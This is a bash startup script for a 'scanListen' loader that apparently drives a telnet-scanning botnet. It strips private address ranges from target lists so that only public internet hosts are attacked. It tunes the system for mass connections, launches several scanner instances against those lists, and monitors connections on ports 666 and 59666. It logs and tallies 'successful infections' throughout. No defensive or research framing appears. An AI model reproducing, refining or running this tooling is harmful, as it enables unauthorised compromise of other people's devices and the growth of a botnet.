#!/bin/bash

# Comprehensive debug startup script for scanListen
echo "=== Starting DEBUG scanListen Loader ==="

# Create debug directory
mkdir -p /root/loader/debug_logs

# Get timestamp
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
DEBUG_LOG="/root/loader/debug_logs/debug_${TIMESTAMP}.log"
SUCCESS_LOG="/root/loader/debug_logs/success_${TIMESTAMP}.log"
MONITOR_LOG="/root/loader/debug_logs/monitor_${TIMESTAMP}.log"

echo "Debug logs will be written to: $DEBUG_LOG"
echo "Success logs will be written to: $SUCCESS_LOG"
echo "Monitor logs will be written to: $MONITOR_LOG"

# Function to log debug information
log_debug() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$DEBUG_LOG"
}

# Function to log successful infections
log_success() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS: $1" | tee -a "$SUCCESS_LOG"
}

# Function to monitor system resources
monitor_resources() {
    while true; do
        sleep 30
        
        # Get system information
        local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
        local mem_usage=$(free | grep Mem | awk '{printf "%.1f", $3/$2 * 100.0}')
        local disk_usage=$(df / | tail -1 | awk '{print $5}' | cut -d'%' -f1)
        
        # Get scanListen process information
        local scan_pids=$(pgrep -f scanListen)
        local scan_count=$(echo "$scan_pids" | wc -l)
        local scan_memory=0
        
        if [ -n "$scan_pids" ]; then
            scan_memory=$(ps -o pid,rss --no-headers -p $scan_pids | awk '{sum+=$2} END {print sum}')
        fi
        
        # Get connection information
        local conn_count=$(ss -tn | grep -E "(666|59666)" | wc -l)
        local established_conns=$(ss -tn | grep ESTAB | wc -l)
        
        # Log system status
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] SYSTEM STATUS:" >> "$MONITOR_LOG"
        echo "  CPU Usage: ${cpu_usage}%" >> "$MONITOR_LOG"
        echo "  Memory Usage: ${mem_usage}%" >> "$MONITOR_LOG"
        echo "  Disk Usage: ${disk_usage}%" >> "$MONITOR_LOG"
        echo "  scanListen Processes: $scan_count" >> "$MONITOR_LOG"
        echo "  scanListen Memory: ${scan_memory}KB" >> "$MONITOR_LOG"
        echo "  Active Connections: $conn_count" >> "$MONITOR_LOG"
        echo "  Established Connections: $established_conns" >> "$MONITOR_LOG"
        echo "  scanListen PIDs: $scan_pids" >> "$MONITOR_LOG"
        echo "---" >> "$MONITOR_LOG"
        
        # Check for successful infections in log files
        if [ -f "$SUCCESS_LOG" ]; then
            local success_count=$(wc -l < "$SUCCESS_LOG")
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] Total successful infections: $success_count" >> "$MONITOR_LOG"
        fi
    done
}

# Function to monitor scanListen output
monitor_scanlisten_output() {
    local instance_name="$1"
    local log_file="/root/loader/debug_logs/scanlisten_${instance_name}_${TIMESTAMP}.log"
    
    log_debug "Starting output monitoring for $instance_name"
    
    # Monitor stderr for infection messages
    while true; do
        sleep 1
        
        # Check if scanListen process is still running
        if ! pgrep -f "scanListen $instance_name" > /dev/null; then
            log_debug "scanListen $instance_name process not found"
            break
        fi
        
        # This is a simplified approach - in a real implementation,
        # you would need to capture and parse the actual output
        # For now, we'll just log the process status
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $instance_name is running" >> "$log_file"
    done
}

# Function to start debug scanListen instance
start_debug_instance() {
    local instance_name="$1"
    local target_file="$2"
    local log_file="/root/loader/debug_logs/scanlisten_${instance_name}_${TIMESTAMP}.log"
    
    log_debug "Starting debug instance: $instance_name with target file: $target_file"
    
    # Start scanListen in background with output redirection
    nohup ./scanListen "$instance_name" < "$target_file" > "$log_file" 2>&1 &
    local pid=$!
    
    log_debug "Started $instance_name with PID: $pid"
    
    # Start output monitoring
    monitor_scanlisten_output "$instance_name" &
    local monitor_pid=$!
    
    echo "$pid $monitor_pid"
}

# Function to create clean target files
create_clean_targets() {
    log_debug "Creating clean target files..."
    
    # Create clean versions of target files (remove local networks)
    if [ -f "telnet.txt" ]; then
        grep -v "^192\.168\." telnet.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > telnet_clean.txt
        log_debug "Created telnet_clean.txt with $(wc -l < telnet_clean.txt) targets"
    fi
    
    if [ -f "big.txt" ]; then
        grep -v "^192\.168\." big.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > big_clean.txt
        log_debug "Created big_clean.txt with $(wc -l < big_clean.txt) targets"
    fi
    
    if [ -f "list.txt" ]; then
        grep -v "^192\.168\." list.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > list_clean.txt
        log_debug "Created list_clean.txt with $(wc -l < list_clean.txt) targets"
    fi
    
    if [ -f "enhanced_targets.txt" ]; then
        grep -v "^192\.168\." enhanced_targets.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > enhanced_clean.txt
        log_debug "Created enhanced_clean.txt with $(wc -l < enhanced_clean.txt) targets"
    fi
}

# Function to cleanup processes
cleanup() {
    log_debug "Cleaning up debug processes..."
    
    # Kill all scanListen processes
    pkill -f scanListen
    
    # Kill monitor processes
    pkill -f "monitor_resources"
    pkill -f "monitor_scanlisten_output"
    
    log_debug "Cleanup complete"
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM

# Main execution
log_debug "Starting debug scanListen loader"

# System optimizations
log_debug "Applying system optimizations..."
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout

# Kill existing processes
log_debug "Stopping existing scanListen processes..."
pkill -f scanListen
sleep 2

# Create clean target files
create_clean_targets

# Start resource monitoring
log_debug "Starting resource monitoring..."
monitor_resources &
MONITOR_PID=$!

# Start debug instances
log_debug "Starting debug scanListen instances..."

# Instance 1: Telnet targets (small subset for debugging)
if [ -f "telnet_clean.txt" ]; then
    head -50 telnet_clean.txt > telnet_debug.txt
    PIDS1=$(start_debug_instance "debug1" "telnet_debug.txt")
    log_debug "Started debug instance 1 with PIDs: $PIDS1"
fi

# Instance 2: Big targets (small subset for debugging)
if [ -f "big_clean.txt" ]; then
    head -50 big_clean.txt > big_debug.txt
    PIDS2=$(start_debug_instance "debug2" "big_debug.txt")
    log_debug "Started debug instance 2 with PIDs: $PIDS2"
fi

# Instance 3: Enhanced targets (small subset for debugging)
if [ -f "enhanced_clean.txt" ]; then
    head -50 enhanced_clean.txt > enhanced_debug.txt
    PIDS3=$(start_debug_instance "debug3" "enhanced_debug.txt")
    log_debug "Started debug instance 3 with PIDs: $PIDS3"
fi

log_debug "All debug instances started"
log_debug "Monitor PID: $MONITOR_PID"

# Display status
echo ""
echo "=== DEBUG LOADER STATUS ==="
echo "Debug log: $DEBUG_LOG"
echo "Success log: $SUCCESS_LOG"
echo "Monitor log: $MONITOR_LOG"
echo "Active scanListen processes:"
ps aux | grep scanListen | grep -v grep
echo "Active connections:"
ss -tn | grep -E "(666|59666)" | wc -l
echo "========================"

# Keep script running and show periodic status
while true; do
    sleep 60
    echo ""
    echo "=== STATUS UPDATE ==="
    echo "Time: $(date)"
    echo "Active scanListen processes: $(ps aux | grep scanListen | grep -v grep | wc -l)"
    echo "Active connections: $(ss -tn | grep -E "(666|59666)" | wc -l)"
    
    if [ -f "$SUCCESS_LOG" ]; then
        echo "Successful infections: $(wc -l < "$SUCCESS_LOG")"
        echo "Recent successes:"
        tail -3 "$SUCCESS_LOG" 2>/dev/null || echo "No successes yet"
    fi
    
    echo "Debug log size: $(ls -lh "$DEBUG_LOG" 2>/dev/null | awk '{print $5}' || echo 'N/A')"
    echo "Monitor log size: $(ls -lh "$MONITOR_LOG" 2>/dev/null | awk '{print $5}' || echo 'N/A')"
    echo "===================="
done
